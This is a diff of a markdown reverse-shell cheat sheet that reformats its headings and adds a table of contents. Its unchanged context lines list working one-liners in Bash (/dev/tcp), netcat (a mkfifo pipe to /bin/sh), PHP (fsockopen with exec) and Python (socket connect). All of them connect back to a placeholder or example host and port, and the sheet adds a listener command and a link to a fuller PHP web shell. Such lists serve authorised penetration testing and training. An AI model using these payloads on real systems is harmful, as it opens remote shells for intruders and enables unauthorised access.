@@ -1,10 +1,12 @@
+# REVERSE SHELL 🐢
 
-### 6) REVERSE SHELL 🐢
+### Table of Contents 
+   1. Bash 
+   2. Netcat 
+   3. PHP 
+   4. Python 
 
------------------------------------------------------------------
------------------------------------------------------------------
-
-**Bash**
+## 1) Bash
 ```Bash_Bash
 bash -i >& /dev/tcp/<IP_TO_CONNECT_TO>/<PORT> 0>&1
 
@@ -16,9 +18,8 @@ bash -i >& /dev/tcp/<IP_TO_CONNECT_TO>/<PORT> 0>&1
  - Example: `nc -nlvp 8080`
 
 -----------------------------------------------------------------
------------------------------------------------------------------
-  
-**Netcat**
+### + + + + + + + + + + + + + + + + + + + + + + +
+## 2) Netcat
 + Netcat is **rarely present on production systems**
  - _Even if it is_ there are _several versions_ of netcat that **don’t support the -e** option
 ```Basic_Netcat
@@ -34,9 +35,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
 -----------------------------------------------------------------
------------------------------------------------------------------
-
-**PHP**
+### + + + + + + + + + + + + + + + + + + + + + + +
+## 3) PHP
 
 ```Basic_PHP
 php -r '$sock=fsockopen("<IP_TO_CONNECT_TO>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -50,9 +50,8 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 [More robust PHP Shell]: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
 
 -----------------------------------------------------------------
------------------------------------------------------------------
-
-**PYTHON**
+### + + + + + + + + + + + + + + + + + + + + + + +
+## 4) PYTHON
 
 ```Tested_On_Python2_(swap_out_IP_and_Port)
 # Command Line Version / Cmd Line Version
@@ -64,5 +63,5 @@ s.connect(("10.0.0.1",1234))
 ```
 
 -----------------------------------------------------------------
------------------------------------------------------------------
+### + + + + + + + + + + + + + + + + + + + + + + +
 
